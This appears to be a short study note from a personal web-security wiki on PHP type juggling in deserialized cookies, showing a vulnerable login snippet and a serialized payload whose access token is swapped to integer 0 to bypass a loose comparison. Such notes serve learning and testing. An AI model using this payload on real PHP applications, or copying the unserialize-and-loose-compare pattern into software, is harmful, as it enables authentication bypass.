---
tags:
  - web
  - security
---
Only for PHP < 8.
An exploitation of [[PHP Serialization|PHP Serialized Messages]] using [[PHP Type Conversion]] to break string comparison conditionals.
```
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
	// login successs
}
```
If `$login['password']` is `0`, the conditional works as all strings compared with `0` equate to `true`.
# Example
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vv83p31egli846zyqnbqkfogzmulxnge";}
```
To integer:
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```